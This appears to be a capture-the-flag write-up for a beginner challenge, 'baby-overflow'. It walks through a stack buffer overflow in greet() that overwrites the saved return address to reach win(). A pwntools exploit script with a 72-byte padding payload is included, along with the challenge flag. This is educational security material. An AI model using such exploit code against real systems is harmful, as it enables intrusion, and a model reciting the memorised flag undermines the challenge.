# baby-overflow — writeup

## Summary

Stack buffer overflow in `greet()` overwrites the saved RIP. Redirect to `win()`.

## Steps

1. The handout binary `chal` is a 64-bit ELF. Run `checksec`:
   - No stack canaries, no PIE, NX may or may not be enabled.
2. `objdump -d chal | grep win` → note the address of `win()`.
3. Buffer `name[64]` lives at `rbp-0x40`. Padding to saved RIP is 64 + 8 (saved RBP) = 72 bytes.
4. Build payload: `b"A" * 72 + p64(win_addr)`.
5. `pwntools`:

   ```python
   from pwn import *
   p = remote(host, port)
   p.recvuntil(b"name? ")
   p.sendline(b"A" * 72 + p64(0x401196))   # win addr
   print(p.recvall().decode())
   ```

## Flag

`mctf{cl4ss1c_buff3r_0v3rfl0w}`
